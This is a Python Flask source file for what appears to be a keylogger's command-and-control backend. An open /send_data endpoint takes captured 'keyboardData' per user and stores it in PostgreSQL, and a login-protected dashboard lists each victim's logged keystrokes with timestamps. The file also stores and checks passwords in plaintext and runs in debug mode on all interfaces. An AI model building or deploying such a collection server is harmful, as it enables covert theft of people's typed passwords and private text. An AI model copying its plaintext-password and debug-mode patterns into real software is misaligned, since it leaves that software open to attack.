from flask import Flask, request, jsonify, render_template, redirect, url_for, session
import psycopg2
from dotenv import load_dotenv
import os
from functools import wraps
from collections import defaultdict

# Load environment variables
load_dotenv()
DBURL = os.getenv("DB_URL")

app = Flask(__name__,template_folder='templates')
app.secret_key = os.urandom(24)  # For session management

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('email')  # Using email field for username
        password = request.form.get('password')
        
        try:
            conn = psycopg2.connect(DBURL)
            cur = conn.cursor()
            query = '''SELECT username FROM userstable WHERE username = %s AND password = %s'''
            cur.execute(query, (username, password))  # Note: In production, use proper password hashing
            user = cur.fetchone()
            cur.close()
            conn.close()

            if user:
                session['username'] = user[0]
                return redirect(url_for('dashboard'))
            else:
                return render_template('login.html', error="Invalid credentials")
        except Exception as e:
            return render_template('login.html', error="Database error occurred")
    
    return render_template('login.html')

@app.route('/dashboard')
@login_required
def dashboard():
    try:
        conn = psycopg2.connect(DBURL)
        cur = conn.cursor()
        
        # Get total users count
        cur.execute('SELECT COUNT(*) FROM userstable')
        total_users = cur.fetchone()[0]
        
        # Get all unique users from log_table
        cur.execute('SELECT DISTINCT "User" FROM log_table ORDER BY "User"')
        users = [row[0] for row in cur.fetchall()]
        
        # Get log data grouped by user
        user_logs = {}
        for user in users:
            cur.execute('''
                SELECT "User", logg, time_stamp
                FROM log_table
                WHERE "User" = %s
                ORDER BY time_stamp DESC
            ''', (user,))
            user_logs[user] = cur.fetchall()
        
        # Get total logs count
        cur.execute('SELECT COUNT(*) FROM log_table')
        total_logs = cur.fetchone()[0]
        
        cur.close()
        conn.close()
        
        return render_template('dashboard.html',
                             total_users=total_users,
                             total_logs=total_logs,
                             users=users,
                             user_logs=user_logs)
    except Exception as e:
        return render_template('dashboard.html', error="Error fetching dashboard data")

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

def save_data_in_db(data):
    try:
        conn = psycopg2.connect(DBURL)
        cur = conn.cursor()
        query = '''INSERT INTO log_table("User", logg, time_stamp) VALUES (%s, %s, %s)'''
        cur.execute(query, (data["User"], data["keyboardData"], data["timestamp"]))
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print("Database error:", e)

@app.route('/send_data', methods=["POST"])
def get_data():
    data = request.get_json()
    if data.get("keyboardData"):
        save_data_in_db(data)
        return jsonify({"status": "success", "message": "Data saved"}), 200
    else:
        return jsonify({"status": "ignored", "message": "Empty keyboardData"}), 204

if __name__ == '__main__':
    app.run(debug=True,host="0.0.0.0", port=5000)
